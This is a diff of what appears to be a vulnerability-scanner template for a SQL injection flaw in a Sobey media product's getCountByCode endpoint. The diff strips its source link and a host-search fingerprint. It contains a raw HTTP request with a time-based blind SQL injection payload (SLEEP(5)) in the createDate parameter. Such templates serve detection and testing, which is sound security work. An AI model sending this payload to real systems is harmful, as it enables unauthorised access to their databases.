@@ -3,12 +3,8 @@ info:
   name: 索贝融媒体getCountByCode存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ozolwps4h6mhen17'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ozolwps4h6mhen17
-    fofa: body="/Sc-TaskMonitoring/"
 http:
 - raw:
   - 'GET /sobey-mchEditor/count/getCountByCode?status=1&createDate=%27+AND+%28SELECT+3155+FROM+%28SELECT%28SLEEP%285%29%29%29tTYh%29+AND+%27YUCP%27%3D%27YUCP HTTP/1.1
